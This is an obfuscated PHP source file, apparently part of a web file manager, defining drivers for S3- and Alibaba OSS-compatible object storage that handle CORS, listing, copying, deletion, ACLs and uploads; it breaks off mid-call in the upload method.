<?php
 goto f»¸ÅƒğÍ™; EÂ¶ÅÀÉê„: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Cƒ™Î¨¥íØ) { parent::__construct($Cƒ™Î¨¥íØ); $this->signatureVersion($_SERVER[Ç³Íß¦Ó][211]); } public function fileOutLink($aµÚëçïÑ‡) { $D™Şù­Ìˆµ =& $_SERVER[Ç³Íß¦Ó]; if (substr($aµÚëçïÑ‡, 0, 7) == $D™Şù­Ìˆµ[1202]) { $aµÚëçïÑ‡ = $D™Şù­Ìˆµ[1203] . substr($aµÚëçïÑ‡, 7); } header($D™Şù­Ìˆµ[159] . $aµÚëçïÑ‡); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($F½¥¯‚ò¤Í) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ç³Íß¦Ó][1258]; $this->_init($F½¥¯‚ò¤Í); } public function _init($c¿•áÛ) { $Aùğçï½ =& $_SERVER[Ç³Íß¦Ó]; foreach ($c¿•áÛ as $d–˜Û •‹á => $ašè¯ÉÁØØ) { if (isset($this->{$d–˜Û •‹á})) { $this->{$d–˜Û •‹á} = $ašè¯ÉÁØØ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Aùğçï½[1259] . LNG($Aùğçï½[1260])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eîõÉ·ò›; fÜ·âÉ¥¿: $B´Ø„Ÿ»¤->addAllowedMethod($c¦˜Áİ†¾ì[1264]); $B´Ø„Ÿ»¤->addAllowedMethod($c¦˜Áİ†¾ì[1265]); $B´Ø„Ÿ»¤->addAllowedMethod($c¦˜Áİ†¾ì[158]); goto eŠ³˜ï‹¸ƒ; eîõÉ·ò›: $c¦˜Áİ†¾ì =& $_SERVER[Ç³Íß¦Ó]; $dÏñ¼Ø“Ñ = new OSS\Model\CorsConfig(); $B´Ø„Ÿ»¤ = new OSS\Model\CorsRule(); goto e‚Úê’•À; f÷ïê²Ê‘: $dÏñ¼Ø“Ñ->addRule($B´Ø„Ÿ»¤); try { $this->client->putBucketCors($this->bucket, $dÏñ¼Ø“Ñ); } catch (OSS\Core\OssException $CªÉ¢¦‚®Ú) { return !1; } return !0; goto eğ¡ˆÎß·; e‚Úê’•À: $B´Ø„Ÿ»¤->addAllowedOrigin($c¦˜Áİ†¾ì[1261]); $B´Ø„Ÿ»¤->addAllowedMethod($c¦˜Áİ†¾ì[1262]); $B´Ø„Ÿ»¤->addAllowedMethod($c¦˜Áİ†¾ì[1263]); goto fÜ·âÉ¥¿; eŠ³˜ï‹¸ƒ: $B´Ø„Ÿ»¤->setMaxAgeSeconds(600); $B´Ø„Ÿ»¤->addExposeHeader($c¦˜Áİ†¾ì[1266]); $B´Ø„Ÿ»¤->addAllowedHeader($c¦˜Áİ†¾ì[1261]); goto f÷ïê²Ê‘; eğ¡ˆÎß·: } public function getBucketCors() { goto CĞèÚ©Î§; CĞèÚ©Î§: $D˜ªĞâä =& $_SERVER[Ç³Íß¦Ó]; $EĞ‡¶ãàºÃ = null; try { $EĞ‡¶ãàºÃ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $BñÑ£ò¤ã) { return null; } goto bÓ²œ®¬¡ï; bæë¬¨ÃËÄ: $FËºäŒ‰‚ = $D‰„ò¥Øâ[0]->getMaxAgeSeconds(); $AçŞİ¬¸æ® = $D‰„ò¥Øâ[0]->getExposeHeaders(); $aªŸî»âº÷ = $D‰„ò¥Øâ[0]->getAllowedHeaders(); goto fÆË«›Çé; fÆË«›Çé: return array($D˜ªĞâä[181] => isset($a‘ÅßÀ“[0]) ? $a‘ÅßÀ“[0] : $D˜ªĞâä[33], $D˜ªĞâä[185] => $F„…ˆ¡º¹, $D˜ªĞâä[1267] => $FËºäŒ‰‚, $D˜ªĞâä[1268] => isset($AçŞİ¬¸æ®[0]) ? $AçŞİ¬¸æ®[0] : $D˜ªĞâä[33], $D˜ªĞâä[183] => isset($aªŸî»âº÷[0]) ? $aªŸî»âº÷[0] : $D˜ªĞâä[33]); goto e™¤ïÀŒ‡£; bÓ²œ®¬¡ï: if (!$EĞ‡¶ãàºÃ || !($D‰„ò¥Øâ = $EĞ‡¶ãàºÃ->getRules())) { return null; } $a‘ÅßÀ“ = $D‰„ò¥Øâ[0]->getAllowedOrigins(); $F„…ˆ¡º¹ = $D‰„ò¥Øâ[0]->getAllowedMethods(); goto bæë¬¨ÃËÄ; e™¤ïÀŒ‡£: } public function isBucketCors() { goto dÀé’ÓŒâ‡; dÀé’ÓŒâ‡: $DÜ«Ç£â‚Â =& $_SERVER[Ç³Íß¦Ó]; $bë‘Ø¢ĞÉ„ = $this->getBucketCors(); if (!$bë‘Ø¢ĞÉ„ || !is_array($bë‘Ø¢ĞÉ„)) { return !1; } goto b¡ÓğÀ…¬†; Eİä’ë“è: $f°ŒÌ¨§Â† = array($DÜ«Ç£â‚Â[186], $DÜ«Ç£â‚Â[187], $DÜ«Ç£â‚Â[188], $DÜ«Ç£â‚Â[189], $DÜ«Ç£â‚Â[190]); $FæÒ£ã•‹ñ = array_diff($f°ŒÌ¨§Â†, $A£öÔ»—›ò); return empty($FæÒ£ã•‹ñ); goto E†Ï–‰‘ÃÇ; b¡ÓğÀ…¬†: if ($bë‘Ø¢ĞÉ„[$DÜ«Ç£â‚Â[181]] != $DÜ«Ç£â‚Â[182] || $bë‘Ø¢ĞÉ„[$DÜ«Ç£â‚Â[183]] != $DÜ«Ç£â‚Â[182]) { return !1; } $A£öÔ»—›ò = array_map($DÜ«Ç£â‚Â[184], $bë‘Ø¢ĞÉ„[$DÜ«Ç£â‚Â[185]]); if (!is_array($A£öÔ»—›ò)) { $A£öÔ»—›ò = array(); } goto Eİä’ë“è; E†Ï–‰‘ÃÇ: } public function mkfile($Bïö¾Š¡ôğ, $b­ÑÙÊ¿ = '', $fÀùğ“ÎÏÇ = REPEAT_RENAME) { $bæòƒ”ä¿ = $this->setContent($Bïö¾Š¡ôğ, $b­ÑÙÊ¿); if ($bæòƒ”ä¿ !== !1) { return $this->getPathOuter($Bïö¾Š¡ôğ); } return !1; } public function mkdir($BŒœ¡ŸŠ´Ò, $Aá±òÆ¥³ = REPEAT_SKIP) { if ($this->_isFolder($BŒœ¡ŸŠ´Ò)) { return $this->getPathOuter($BŒœ¡ŸŠ´Ò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($BŒœ¡ŸŠ´Ò)); } catch (OSS\Core\OssException $c¼ğ§œğÅ¨) { return !1; } return $this->getPathOuter($BŒœ¡ŸŠ´Ò); } private function fileList($a‘Ô‡ãÜ…, $e…³µãÀ³ø = '', $E±ÏÆ·İé± = 0) { goto F‚íŠİÆù»; F‚íŠİÆù»: $Aã¥„Ïã»Ê =& $_SERVER[Ç³Íß¦Ó]; $a‘Ô‡ãÜ… = trim($a‘Ô‡ãÜ…, $Aã¥„Ïã»Ê[8]); $d™ŠËøÛƒ» = empty($a‘Ô‡ãÜ…) ? $Aã¥„Ïã»Ê[33] : $a‘Ô‡ãÜ… . $Aã¥„Ïã»Ê[8]; goto C¬†ãœÄ‹; aØ‚ƒ—µ¦ : return array($Aã¥„Ïã»Ê[75] => $f³ÀçÍÇ—ä, $Aã¥„Ïã»Ê[74] => $AÆĞ´ÊÕÑ¨); goto f¹êá±ªÊ; c†è²í×“: $f³ÀçÍÇ—ä = $AÆĞ´ÊÕÑ¨ = array(); while (!0) { check_abort(); $b‚‚âçÄÂÃ = array($Aã¥„Ïã»Ê[1269] => $e…³µãÀ³ø, $Aã¥„Ïã»Ê[1270] => $d™ŠËøÛƒ», $Aã¥„Ïã»Ê[1271] => $AÁ¯‹¡œİ±, $Aã¥„Ïã»Ê[1272] => $eÎ§‡óáùŸ); try { $c•·´¢Ÿâã = $this->client->listObjects($this->bucket, $b‚‚âçÄÂÃ); } catch (OSS\Core\OssException $E÷·èÉ´‚) { break; } $eÎ§‡óáùŸ = $c•·´¢Ÿâã->getNextMarker(); $fß«º¥•” = $c•·´¢Ÿâã->getObjectList(); $Cˆˆ…ÒñÖ = $c•·´¢Ÿâã->getPrefixList(); foreach ($fß«º¥•” as $cïÒçâ¾ó) { goto e¡ö«Áò‡˜; e¡ö«Áò‡˜: if ($cïÒçâ¾ó->getKey() == $d™ŠËøÛƒ») { continue; } $CÖ©ŠÊ·Ù¨ = $cïÒçâ¾ó->getKey(); $cŠ¥ˆ­êìï = $cïÒçâ¾ó->getSize(); goto d‡Î®†àØ•; c¹¿‘««æ: if ($eÄ´†²ñíš) { $this->cacheMethod($Aã¥„Ïã»Ê[198], $CÖ©ŠÊ·Ù¨, $b·İÖÉŞÅ); $this->cacheMethod($Aã¥„Ïã»Ê[199], $CÖ©ŠÊ·Ù¨, array($Aã¥„Ïã»Ê[78] => $cŠ¥ˆ­êìï, $Aã¥„Ïã»Ê[1273] => $cŠ¥ˆ­êìï, $Aã¥„Ïã»Ê[84] => strtotime($fË¨¥Ïê«¯), $Aã¥„Ïã»Ê[1274] => $fË¨¥Ïê«¯)); } if ($b·İÖÉŞÅ) { $f³ÀçÍÇ—ä[] = $CÖ©ŠÊ·Ù¨; continue; } $AÆĞ´ÊÕÑ¨[] = $e…áÚğòÛË; goto Bß¸¡„Å–¢; d‡Î®†àØ•: $fË¨¥Ïê«¯ = $cïÒçâ¾ó->getLastModified(); $e…áÚğòÛË = $E±ÏÆ·İé± ? array($Aã¥„Ïã»Ê[28] => $CÖ©ŠÊ·Ù¨, $Aã¥„Ïã»Ê[78] => $cŠ¥ˆ­êìï, $Aã¥„Ïã»Ê[196] => strtotime($fË¨¥Ïê«¯)) : $CÖ©ŠÊ·Ù¨; $b·İÖÉŞÅ = $cŠ¥ˆ­êìï == 0 && substr($CÖ©ŠÊ·Ù¨, strlen($CÖ©ŠÊ·Ù¨) - 1, 1) == $Aã¥„Ïã»Ê[8] ? !0 : !1; goto c¹¿‘««æ; Bß¸¡„Å–¢: } foreach ($Cˆˆ…ÒñÖ as $d• íÇŠŒÕ) { $f³ÀçÍÇ—ä[] = $d• íÇŠŒÕ->getPrefix(); if ($eÄ´†²ñíš) { $this->cacheMethod($Aã¥„Ïã»Ê[198], $CÖ©ŠÊ·Ù¨, !0); } } if ($eÎ§‡óáùŸ === $Aã¥„Ïã»Ê[33]) { break; } } if ($eÄ´†²ñíš) { $this->cacheMethod($Aã¥„Ïã»Ê[198], $a‘Ô‡ãÜ…, !0); } goto aØ‚ƒ—µ¦ ; C¬†ãœÄ‹: $eÎ§‡óáùŸ = $Aã¥„Ïã»Ê[33]; $AÁ¯‹¡œİ± = 1000; $eÄ´†²ñíš = $this->listItemCache === !1 ? !1 : !0; goto c†è²í×“; f¹êá±ªÊ: } public function copyFile($f‘‹ Ø•ä«, $E‰ÅÂ•ã…) { $aÓÜâÌ•ëÊ = $this->size($f‘‹ Ø•ä«); if ($aÓÜâÌ•ëÊ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $f‘‹ Ø•ä«, $this->bucket, $this->pathEncode($E‰ÅÂ•ã…)); } catch (OSS\Core\OssException $BÌÍÖàÖíí) { return !1; } return $this->getPathOuter($E‰ÅÂ•ã…); } $e¥á¢©’¤º = $this->multiCopyObject($f‘‹ Ø•ä«, $E‰ÅÂ•ã…, $aÓÜâÌ•ëÊ); return $e¥á¢©’¤º ? $this->getPathOuter($E‰ÅÂ•ã…) : !1; } private function multiCopyObject($D«ÀˆÑ½ï’, $a…¾äã’‰õ, $e·°ÁâÍ½) { $C°ßÎİ‹» =& $_SERVER[Ç³Íß¦Ó]; try { goto Få„¢…—›¶; Få„¢…—›¶: $F¨¡ÑŠß® = array(); if ($d¾„ÔùøÄ® = $this->hashMd5($D«ÀˆÑ½ï’)) { $F¨¡ÑŠß® = array(OSS\OssClient::OSS_HEADERS => array($C°ßÎİ‹»[1275] => $d¾„ÔùøÄ®)); } $EÑ‚ÌİÛŒ… = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a…¾äã’‰õ), $F¨¡ÑŠß®); goto ağãÊ°áÚ„; E–±—ê¾³: $bÅ•í»«Ğğ = 1024 * 1024 * 10; $fÒá¡ñİ¬æ = $this->client->generateMultiuploadParts($e·°ÁâÍ½, $bÅ•í»«Ğğ); foreach ($fÒá¡ñİ¬æ as $c ƒ§öÂà± => $B¯ ”ÎŒÕà) { $E «®õÊÂ = $F›É‚™ãŒ‚ + (int) $B¯ ”ÎŒÕà[$C°ßÎİ‹»[1276]]; $EŸø·ª–† = (int) $B¯ ”ÎŒÕà[$C°ßÎİ‹»[334]] + $E «®õÊÂ - 1; $a‘¸Ü•Ñ–‡ = array($C°ßÎİ‹»[1277] => $E «®õÊÂ, $C°ßÎİ‹»[1278] => $EŸø·ª–†); $dÓ‡Šòğ·…[] = $this->client->uploadPartCopy($this->bucket, $D«ÀˆÑ½ï’, $this->bucket, $this->pathEncode($a…¾äã’‰õ), $eÂ¢ƒŞ·½‰, $EÑ‚ÌİÛŒ…, $a‘¸Ü•Ñ–‡); $eÂ¢ƒŞ·½‰ = $eÂ¢ƒŞ·½‰ + 1; } goto dİñˆÌ¸Ÿ; ağãÊ°áÚ„: $eÂ¢ƒŞ·½‰ = 1; $F›É‚™ãŒ‚ = 0; $dÓ‡Šòğ·… = array(); goto E–±—ê¾³; dİñˆÌ¸Ÿ: $A‰ğ‘Öº÷« = array(); foreach ($dÓ‡Šòğ·… as $c ƒ§öÂà± => $DÎùÃ±¨œâ) { $A‰ğ‘Öº÷«[] = array($C°ßÎİ‹»[1279] => $c ƒ§öÂà± + 1, $C°ßÎİ‹»[1280] => $DÎùÃ±¨œâ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($a…¾äã’‰õ), $EÑ‚ÌİÛŒ…, $A‰ğ‘Öº÷«); goto bÆ”‰Ÿ§à¶; bÆ”‰Ÿ§à¶: } catch (OSS\Core\OssException $b³ÎÊ½À¦) { return !1; } return !0; } public function moveFile($F Ş†ˆ“ÉÌ, $e„ÑÌ¯Å•„) { if ($this->copyFile($F Ş†ˆ“ÉÌ, $e„ÑÌ¯Å•„)) { $this->remove($F Ş†ˆ“ÉÌ); return $this->getPathOuter($e„ÑÌ¯Å•„); } return !1; } public function delFile($bŠãß‹¦¡) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($bŠãß‹¦¡)); } catch (OSS\Core\OssException $DÂ·°»†’¤) { return !1; } return !0; } public function delFolder($BãÀÏÚ£ÚÑ) { goto D­Æ¡Š÷ğæ; D­Æ¡Š÷ğæ: $b”Î‚óˆ… =& $_SERVER[Ç³Íß¦Ó]; if (!$this->exist($BãÀÏÚ£ÚÑ)) { return !0; } $this->listItemCache = !1; goto d¿´ØÃÁİ; d¿´ØÃÁİ: $Fèìóˆ = $this->fileList($BãÀÏÚ£ÚÑ); $this->listItemCache = !0; $CÕ‘ÃêµÌ† = trim($BãÀÏÚ£ÚÑ, $b”Î‚óˆ…[8]) . $b”Î‚óˆ…[8]; goto Bé´–Š¹¥¯; Bé´–Š¹¥¯: if (!empty($BãÀÏÚ£ÚÑ) && !in_array($CÕ‘ÃêµÌ†, $Fèìóˆ[$b”Î‚óˆ…[75]])) { $Fèìóˆ[$b”Î‚óˆ…[75]][] = $CÕ‘ÃêµÌ†; } $d±‡ï„ÁŸç = $this->delByBatch($Fèìóˆ[$b”Î‚óˆ…[74]]); if (!$d±‡ï„ÁŸç) { return !1; } goto dœ½ôñè¤Ç; dœ½ôñè¤Ç: return $this->delByBatch($Fèìóˆ[$b”Î‚óˆ…[75]]); goto FİãÅ¿“ˆ; FİãÅ¿“ˆ: } private function delByBatch($c¼§„³•Óì) { foreach (array_chunk($c¼§„³•Óì, 1000) as $CÙñˆ˜İŠÍ) { try { $this->client->deleteObjects($this->bucket, $CÙñˆ˜İŠÍ); } catch (OSS\Core\OssException $Cöâ±Ï‘À—) { return !1; } } return !0; } public function rename($dº•ÒÀÅŠ, $Dµ…Èˆëª) { return $this->renameObject($dº•ÒÀÅŠ, $Dµ…Èˆëª); } private function fileInfo($CÄ‰’´–Á¶, $B’êØ¤ÇŒ = false, $bÅÎâ©è²÷ = array()) { goto DÃß·¤¡ö; DÃß·¤¡ö: $CŒ¯åËé“ =& $_SERVER[Ç³Íß¦Ó]; $Fìøª õÜ‡ = array($CŒ¯åËé“[28] => $this->pathThis($CÄ‰’´–Á¶), $CŒ¯åËé“[76] => $this->getPathOuter($CÄ‰’´–Á¶), $CŒ¯åËé“[29] => $CŒ¯åËé“[192], $CŒ¯åËé“[78] => isset($bÅÎâ©è²÷[$CŒ¯åËé“[78]]) ? $bÅÎâ©è²÷[$CŒ¯åËé“[78]] : 0, $CŒ¯åËé“[168] => $this->ext($CÄ‰’´–Á¶)); if ($B’êØ¤ÇŒ) { return $Fìøª õÜ‡; } goto AÄİÍ‚™†; eÒ£©šõŸ: if (isset($bÅÎâ©è²÷[$CŒ¯åËé“[78]])) { $Fìøª õÜ‡[$CŒ¯åËé“[78]] = $bÅÎâ©è²÷[$CŒ¯åËé“[78]]; } if (isset($bÅÎâ©è²÷[$CŒ¯åËé“[84]])) { $Fìøª õÜ‡[$CŒ¯åËé“[84]] = $bÅÎâ©è²÷[$CŒ¯åËé“[84]]; } if (isset($bÅÎâ©è²÷[$CŒ¯åËé“[196]]) && !trim($Fìøª õÜ‡[$CŒ¯åËé“[84]])) { $Fìøª õÜ‡[$CŒ¯åËé“[84]] = $bÅÎâ©è²÷[$CŒ¯åËé“[196]]; } goto d²Û¹«ŒÕğ; AÄİÍ‚™†: $Fìøª õÜ‡[$CŒ¯åËé“[193]] = $Fìøª õÜ‡[$CŒ¯åËé“[84]] = 0; $Fìøª õÜ‡[$CŒ¯åËé“[194]] = $Fìøª õÜ‡[$CŒ¯åËé“[195]] = !0; if (empty($bÅÎâ©è²÷)) { $Fß‹Å±ÖÓ¯ = $this->objectMeta($CÄ‰’´–Á¶); if (!$Fß‹Å±ÖÓ¯) { return $Fìøª õÜ‡; } $bÅÎâ©è²÷ = array($CŒ¯åËé“[84] => strtotime($Fß‹Å±ÖÓ¯[$CŒ¯åËé“[1274]]), $CŒ¯åËé“[78] => $Fß‹Å±ÖÓ¯[$CŒ¯åËé“[1273]] + 0); } goto eÒ£©šõŸ; d²Û¹«ŒÕğ: return $Fìøª õÜ‡; goto bí°´¬ãÃ; bí°´¬ãÃ: } private function folderInfo($FĞêÈÖñ°ó, $fˆ ŒÓ¬Úñ = false, $DíéË­ª•Æ = array()) { goto fĞÙ¸ÜÀÛÔ; Bã‚ª§²šò: if (isset($DíéË­ª•Æ[$f‚±¤âÜ…Š[84]])) { $Aø ó£ÃŠ®[$f‚±¤âÜ…Š[84]] = $DíéË­ª•Æ[$f‚±¤âÜ…Š[84]]; } if (isset($DíéË­ª•Æ[$f‚±¤âÜ…Š[193]])) { $Aø ó£ÃŠ®[$f‚±¤âÜ…Š[193]] = $DíéË­ª•Æ[$f‚±¤âÜ…Š[193]]; } return $Aø ó£ÃŠ®; goto d÷ß‡†Äòß; fĞÙ¸ÜÀÛÔ: $f‚±¤âÜ…Š =& $_SERVER[Ç³Íß¦Ó]; $Aø ó£ÃŠ® = array($f‚±¤âÜ…Š[28] => $this->pathThis($FĞêÈÖñ°ó), $f‚±¤âÜ…Š[76] => $this->getPathOuter($f‚±¤âÜ…Š[8] . $FĞêÈÖñ°ó), $f‚±¤âÜ…Š[29] => $f‚±¤âÜ…Š[77]); if ($fˆ ŒÓ¬Úñ) { return $Aø ó£ÃŠ®; } goto dÙ¥½Éº†; dÙ¥½Éº†: $Aø ó£ÃŠ®[$f‚±¤âÜ…Š[193]] = $Aø ó£ÃŠ®[$f‚±¤âÜ…Š[84]] = 0; $Aø ó£ÃŠ®[$f‚±¤âÜ…Š[194]] = $Aø ó£ÃŠ®[$f‚±¤âÜ…Š[195]] = !0; if (empty($DíéË­ª•Æ)) { $FĞêÈÖñ°ó = rtrim($FĞêÈÖñ°ó, $f‚±¤âÜ…Š[8]) . $f‚±¤âÜ…Š[8]; $D¥™êÁ¿ÉÙ = $this->objectMeta($FĞêÈÖñ°ó); if (!$D¥™êÁ¿ÉÙ) { return $Aø ó£ÃŠ®; } $DíéË­ª•Æ = array($f‚±¤âÜ…Š[193] => $D¥™êÁ¿ÉÙ[$f‚±¤âÜ…Š[1281]][$f‚±¤âÜ…Š[1282]], $f‚±¤âÜ…Š[84] => strtotime($D¥™êÁ¿ÉÙ[$f‚±¤âÜ…Š[1274]])); } goto Bã‚ª§²šò; d÷ß‡†Äòß: } public function listPath($E°‚âë–è, $eßŒ×ì„± = false) { $FÈ—Äáßòê =& $_SERVER[Ç³Íß¦Ó]; $DéÄ¢’µ¨ì = $this->fileList($E°‚âë–è, $FÈ—Äáßòê[8], !0); foreach ($DéÄ¢’µ¨ì[$FÈ—Äáßòê[75]] as $a³ˆµ‘¸¸ => $Bìá°ƒ¯Œó) { $DéÄ¢’µ¨ì[$FÈ—Äáßòê[75]][$a³ˆµ‘¸¸] = $this->folderInfo($Bìá°ƒ¯Œó, $eßŒ×ì„±, $Bìá°ƒ¯Œó); } foreach ($DéÄ¢’µ¨ì[$FÈ—Äáßòê[74]] as $a³ˆµ‘¸¸ => $Bìá°ƒ¯Œó) { $DéÄ¢’µ¨ì[$FÈ—Äáßòê[74]][$a³ˆµ‘¸¸] = $this->fileInfo($Bìá°ƒ¯Œó[$FÈ—Äáßòê[28]], $eßŒ×ì„±, $Bìá°ƒ¯Œó); } return $DéÄ¢’µ¨ì; } public function has($cµäòãè, $eŸ“ Ùİô = false, $fØ¡ÊË³ïç = true) { goto eå¾ˆîÍ·Ä; E‹ô´­Í´×: while (!0) { check_abort(); $FéÒ¡Ëñ¹ã = array($Fìó¢©Áá[1269] => $Fìó¢©Áá[8], $Fìó¢©Áá[1270] => $e‘ŸÛéå°÷, $Fìó¢©Áá[1271] => $AÂ±Ã‡Ÿùº, $Fìó¢©Áá[1272] => $b–ŸÛÒÙ±Õ); try { $DÜ²©àçˆÓ = $this->client->listObjects($this->bucket, $FéÒ¡Ëñ¹ã); } catch (OSS\Core\OssException $eõ»Õ‹çÇñ) { break; } $b–ŸÛÒÙ±Õ = $DÜ²©àçˆÓ->getNextMarker(); $dŠ·àÃ¾Óå = $DÜ²©àçˆÓ->getObjectList(); $cïÑ«´·ï„ = $DÜ²©àçˆÓ->getPrefixList(); if ($eŸ“ Ùİô) { if (count($dŠ·àÃ¾Óå) > 1 || count($dŠ·àÃ¾Óå) == 1 && $dŠ·àÃ¾Óå[0]->getKey() != $e‘ŸÛéå°÷) { $fñ‘Â‚›á‘ += count($dŠ·àÃ¾Óå) - 1; } if (!empty($cïÑ«´·ï„)) { $Aä³æï´ôä += count($cïÑ«´·ï„); } if ($b–ŸÛÒÙ±Õ === $Fìó¢©Áá[33]) { break; } continue; } if ($fØ¡ÊË³ïç) { if (!empty($dŠ·àÃ¾Óå)) { if (count($dŠ·àÃ¾Óå) > 1 || $dŠ·àÃ¾Óå[0]->getKey() != $e‘ŸÛéå°÷) { return !0; } } } else { if (!empty($cïÑ«´·ï„)) { return !0; } } if ($b–ŸÛÒÙ±Õ === $Fìó¢©Áá[33]) { break; } } if ($eŸ“ Ùİô) { return array($Fìó¢©Áá[202] => $fñ‘Â‚›á‘, $Fìó¢©Áá[203] => $Aä³æï´ôä); } return !1; goto fĞñ¥ƒ‚­®; Cğö‹ÅÇ…—: $b–ŸÛÒÙ±Õ = $Fìó¢©Áá[33]; $AÂ±Ã‡Ÿùº = 500; $fñ‘Â‚›á‘ = $Aä³æï´ôä = 0; goto E‹ô´­Í´×; eå¾ˆîÍ·Ä: $Fìó¢©Áá =& $_SERVER[Ç³Íß¦Ó]; $cµäòãè = trim($cµäòãè, $Fìó¢©Áá[8]); $e‘ŸÛéå°÷ = empty($cµäòãè) ? $Fìó¢©Áá[33] : $cµäòãè . $Fìó¢©Áá[8]; goto Cğö‹ÅÇ…—; fĞñ¥ƒ‚­®: } public function listAll($C’¼˜¹¤) { $CÕÂ’­‰ =& $_SERVER[Ç³Íß¦Ó]; $F•ÖñÉ†ñ = $this->fileList($C’¼˜¹¤, $CÕÂ’­‰[33], !0); $a¹‚Ì¸¦ÎÇ = array(); foreach ($F•ÖñÉ†ñ[$CÕÂ’­‰[74]] as $cÉ´Šï×èù) { $a¹‚Ì¸¦ÎÇ[$cÉ´Šï×èù[$CÕÂ’­‰[28]]] = $cÉ´Šï×èù[$CÕÂ’­‰[78]]; } foreach ($F•ÖñÉ†ñ[$CÕÂ’­‰[75]] as $cÉ´Šï×èù) { if (is_string($cÉ´Šï×èù)) { $a¹‚Ì¸¦ÎÇ[$cÉ´Šï×èù] = 0; } } return $this->listAllFiles($C’¼˜¹¤, array_keys($a¹‚Ì¸¦ÎÇ), $a¹‚Ì¸¦ÎÇ); } public function canRead($B…Œ­Ÿ‰Œ°) { $e¤ç‡÷ˆŒ½ =& $_SERVER[Ç³Íß¦Ó]; $A“¿æŒ—½Ù = $this->pathAcl($B…Œ­Ÿ‰Œ°); return $A“¿æŒ—½Ù == $e¤ç‡÷ˆŒ½[1283] || $A“¿æŒ—½Ù == $e¤ç‡÷ˆŒ½[518] ? !0 : !1; } public function canWrite($F§ŒÉÕƒ‹ù) { $aÄ‘¢‡é = $this->pathAcl($F§ŒÉÕƒ‹ù); return $aÄ‘¢‡é == $_SERVER[Ç³Íß¦Ó][518] ? !0 : !1; } public function pathAcl($d³÷ÚÜ°Ë) { goto C©…µòŒàˆ; F‚Ç±¡¢–Õ: return $B¡ÏÕÕù¥ó; goto CâïÉà§Œ; C©…µòŒàˆ: $b“»Ã¶¥ =& $_SERVER[Ç³Íß¦Ó]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $eÇÓ¨ù§¢È = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d³÷ÚÜ°Ë)); } catch (OSS\Core\OssException $CÎ÷¨á…¾™) { return !1; } goto cŠÆßŠƒÏ»; cŠÆßŠƒÏ»: $B¡ÏÕÕù¥ó = $eÇÓ¨ù§¢È == $b“»Ã¶¥[34] ? $this->bucketAcl : $eÇÓ¨ù§¢È; if ($B¡ÏÕÕù¥ó == $b“»Ã¶¥[1284]) { return $b“»Ã¶¥[1283]; } if ($B¡ÏÕÕù¥ó == $b“»Ã¶¥[1285]) { return $b“»Ã¶¥[518]; } goto F‚Ç±¡¢–Õ; CâïÉà§Œ: } private function chmodPath($F ‚õ­Å, $e‡İ£³ÂÔ¯ = '') { $A‹™÷ñ•§² =& $_SERVER[Ç³Íß¦Ó]; $dğô—©Ï‡ = empty($e‡İ£³ÂÔ¯) ? $A‹™÷ñ•§²[1285] : $e‡İ£³ÂÔ¯; $c“ï¤íä‹ = array($A‹™÷ñ•§²[34], $A‹™÷ñ•§²[191], $A‹™÷ñ•§²[1284], $A‹™÷ñ•§²[1285]); if (!in_array($dğô—©Ï‡, $c“ï¤íä‹)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($F ‚õ­Å), $dğô—©Ï‡); } catch (OSS\Core\OssException $d×‚ó—İ¥) { return !1; } return !0; } public function getContent($DÃø¬Í×ñ¨) { return $this->fileSubstr($DÃø¬Í×ñ¨, -1); } public function setContent($eëÂöÚêÈÕ, $Eë“á’Š–ù = '') { $Cõøİµèß¢ =& $_SERVER[Ç³Íß¦Ó]; try { $Eè«Á˜‰š = $this->trafficLimit($Cõøİµèß¢[1286]); $F…¾ êâ• = $this->client->putObject($this->bucket, $this->pathEncode($eëÂöÚêÈÕ), $Eë“á’Š–ù, $Eè«Á˜‰š); } catch (OSS\Core\OssException $Cƒ›ÖÊ…˜) { return !1; } $cÆÔƒ½ = array($Cõøİµèß¢[1275] => trim($F…¾ êâ•[$Cõøİµèß¢[1287]], $Cõøİµèß¢[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eëÂöÚêÈÕ))); $this->updateObjMeta($eëÂöÚêÈÕ, $cÆÔƒ½); return isset($F…¾ êâ•[$Cõøİµèß¢[1288]][$Cõøİµèß¢[1234]]) ? !0 : !1; } private function updateObjMeta($CåÕ•³ˆà¨, $B¾´ôÃ¨‹) { $CåÕ•³ˆà¨ = $this->pathEncode($CåÕ•³ˆà¨); try { $b‰×‡›Ö•Ğ = array(OSS\OssClient::OSS_HEADERS => $B¾´ôÃ¨‹); $this->client->copyObject($this->bucket, $CåÕ•³ˆà¨, $this->bucket, $CåÕ•³ˆà¨, $b‰×‡›Ö•Ğ); } catch (OSS\Core\OssException $bÂ–­²¥‚¥) { return !1; } return !0; } public function upload($a‡³Á¸çàº, $Dˆ»¬ç­´„, $b„Ğ¸İöÖà = false, $Cò¨¥Ç•¯½ = REPEAT_REPLACE) { $d©‡æ¸©¬ =& $_SERVER[Ç³Íß¦Ó]; $eÌß­Â÷èÙ = trim($a‡³Á¸çàº, $d©‡æ¸©¬[8]); $fÀç«Ïèœ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($d©‡æ¸©¬[1275] => @md5_file($Dˆ»¬ç­´„)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a‡³Á¸çàº))); $fÀç«Ïèœ = $this->trafficLimit($d©‡æ¸©¬[1286], $fÀç«Ïèœ); try { $this->client->multiuploadFile($this->bucket, 